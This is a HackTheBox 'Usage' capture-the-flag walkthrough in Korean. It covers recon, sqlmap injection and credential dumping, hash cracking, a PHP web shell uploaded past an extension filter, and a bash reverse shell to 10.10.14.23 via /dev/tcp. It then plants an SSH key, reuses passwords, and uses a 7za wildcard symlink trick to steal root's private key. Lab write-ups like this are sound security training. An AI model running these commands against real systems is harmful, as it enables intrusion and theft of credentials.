# Usage - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA usage 10.129.23.124
```
<img width="1203" height="319" alt="image" src="https://github.com/user-attachments/assets/9aad0e09-f5f3-4c81-8213-de88ba294eb7" />

- SSH(22)
- HTTP(80)

<br>

- `/etc/hosts`에 `usage.htb` 추가.
<img width="1203" height="73" alt="image" src="https://github.com/user-attachments/assets/20029db6-23a5-458e-b2bf-45a2eb92ec6c" />

---
## HTTP
### banner grabbing
<img width="1203" height="135" alt="image" src="https://github.com/user-attachments/assets/1c8aee66-a049-4544-913d-5907e1a003ec" />
<img width="1203" height="423" alt="image" src="https://github.com/user-attachments/assets/4bceae08-aba6-4de2-86af-473d74a56566" />

### SQL Injection
- 메인페이지에서 `admin`탭을 클릭하니 `admin.usage.htb`로 연결.
- `/etc/hosts`에 `admin.usage.htb` 추가.
<img width="1203" height="72" alt="image" src="https://github.com/user-attachments/assets/5d2dc17f-9c41-4074-8099-e5345d13e15a" />

<br>
<br>

- `Reset Password`를 클릭해서 `'`을 붙여서 요청하니 서버 에러가 발생.
<img width="1524" height="535" alt="image" src="https://github.com/user-attachments/assets/6e8c3e03-86cb-40b1-bbc1-2506d033c828" />
<img width="1524" height="535" alt="image" src="https://github.com/user-attachments/assets/a10437f2-ad21-4054-9306-59deddda3775" />

<br>
<br>

- `sqlmap`으로 인젝션 테스트.
```bash
sqlmap -r req -p email --threads 10 --level=5 --risk=3 --batch
```
<img width="1203" height="273" alt="image" src="https://github.com/user-attachments/assets/7cdfb2b9-9054-40b1-8ddd-cc3540f4cb4f" />

<br>
<br>

- `admin_users`테이블 내용 수집.
```bash
sqlmap -r req -p email --level=5 --risk=3 --batch -D usage_blog -T admin_users --dump
```
<img width="1207" height="222" alt="image" src="https://github.com/user-attachments/assets/ff0aa4cc-3647-4040-8db3-993994c63ece" />

<br>
<br>

- 해시 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1207" height="254" alt="image" src="https://github.com/user-attachments/assets/9d7bd7c6-3e06-492f-80f4-8e2b935149a1" />

### Upload Web Shell
- `admin:whatever1`로 `/admin` 경로 접속.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/77583e80-58be-4e76-b690-1ed8fdd4bcb7" />

<br>
<br>

- 우측의 `settings`를 클릭하여 사진 변경 시도.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/bf75024c-5c85-4906-88b3-4857eb1499c2" />

<br>
<br>

- `php`파일 업로드 실패.
<img width="1168" height="343" alt="image" src="https://github.com/user-attachments/assets/b45ae5f3-3a51-4e58-9d2a-1e5c057e2342" />

<br>
<br>

- `ex.php`를 `ex.jpeg`로 변경해서 업로드 시도하여 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/73cae9b1-8583-4821-8572-f6915c936f00" />

<br>
<br>

- `burpsuite`로 가로채서 파일명에 `.php`를 붙인 후에 업로드 시도하여 성공.
<img width="1524" height="308" alt="image" src="https://github.com/user-attachments/assets/b9be455c-1e7d-438a-947d-dd3c1934fc26" />
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/2a0ae4de-30a6-4c7b-858b-ec5584a5b5da" />

<br>
<br>

- 명령어 실행 성공.
```bash
curl 'http://admin.usage.htb/uploads/images/ex.jpeg.php?cmd=whoami'
```
<img width="1205" height="142" alt="image" src="https://github.com/user-attachments/assets/32f1cbd1-c445-45fe-ac22-bc57d1a6fa84" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://admin.usage.htb/uploads/images/ex.jpeg.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.23%2F80%200%3E%261%22'
```
<img width="1205" height="70" alt="image" src="https://github.com/user-attachments/assets/4aab29b3-a27f-4c01-ab36-58f25f708817" />

<br>
<br>

- 셸 획득.
<img width="1205" height="199" alt="image" src="https://github.com/user-attachments/assets/83c9bc34-9621-4daf-8f8d-2bc4e9162bbb" />

<br>
<br>

- 로컬의 공개키 저장.
```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILlrEsIjppVET3pJThtlxxe4AHDn2FcASFqe3oQQNwvl kali@kali' >> authorized_keys
```
<img width="1205" height="46" alt="image" src="https://github.com/user-attachments/assets/4eeac611-ca74-46f9-8c74-6c2976815b9c" />

<br>
<br>

- SSH 셸 획득.
```bash
ssh dash@10.129.23.124
```
<img width="1205" height="46" alt="image" src="https://github.com/user-attachments/assets/fd53c4b2-afed-4c10-9988-3be548402b2b" />

---
## Shell as xander
- `/home/dash`에 숨김파일로 `.monitrc`발견.
<img width="1205" height="352" alt="image" src="https://github.com/user-attachments/assets/68aa9542-60fa-4e95-98f1-befceb9b975a" />

<br>
<br>

- 비밀번호 획득.
<img width="1203" height="184" alt="image" src="https://github.com/user-attachments/assets/7faa1369-6c1e-4b85-ba0a-a31829edda55" />

<br>
<br>

- `xander:3nc0d3d_pa$$w0rd` 로그인 시도하여 성공.
<img width="1203" height="93" alt="image" src="https://github.com/user-attachments/assets/3312db1b-bfa9-4e21-aa07-e45b08559ad5" />

---
## Privesc
- `/usr/bin/usage_management`를 `root`권한으로 실행 가능.
<img width="1203" height="153" alt="image" src="https://github.com/user-attachments/assets/bb0587d0-8143-487f-a21a-7b5ed068d22e" />

<br>
<br>

- 어떤 기능을 하는지 정확히 몰라서 로컬로 다운로드 받은 후 기드라로 분석.
<img width="295" height="460" alt="image" src="https://github.com/user-attachments/assets/785e6f89-cc19-47f3-9e80-2779cf0bab69" />

<br>
<br>

- `backupWebContent` 함수에서 `7za`를 사용하여 `/var/www/html`의 모든 파일들을 압축하는 코드 발견.
<img width="531" height="241" alt="image" src="https://github.com/user-attachments/assets/cab889a2-7b7e-4f7c-8b0d-6878e7f38623" />

<br>
<br>

- https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks#id-7z
- `@id_rsa`를 생성하고 `/root/.ssh/id_rsa`를 링크 파일로 생성.
```bash
touch @id_rsa

ln -sf /root/.ssh/id_rsa id_rsa
```
<img width="1203" height="45" alt="image" src="https://github.com/user-attachments/assets/2c4b5d5b-9c71-4b28-8b8b-66c21f94cef2" />

<br>
<br>

- `/usr/bin/usage_management`를 `root`권한으로 실행시켜 1번 선택.
- `root`의 `id_rsa` 획득.
```bash
sudo /usr/bin/usage_management
```
<img width="1203" height="554" alt="image" src="https://github.com/user-attachments/assets/8c4d193e-9904-4489-b0fc-83a8529437ba" />

<br>
<br>

- `id_rsa`를사용하여 `root`셸 획득.
```bash
ssh -i id_rsa root@10.129.23.124
```
<img width="1203" height="48" alt="image" src="https://github.com/user-attachments/assets/ea9ba84e-63b0-4a78-885e-18fd05b935fb" />

---
## FLAG
- `/home/dash/user.txt`
<img width="1203" height="354" alt="image" src="https://github.com/user-attachments/assets/436b9f4f-f42b-475f-8797-dee3331ae7d0" />

<br>
<br>

- `/root/root.txt`
<img width="1203" height="334" alt="image" src="https://github.com/user-attachments/assets/2ca4950a-957a-4c1f-aff8-c80053c2e5dc" />
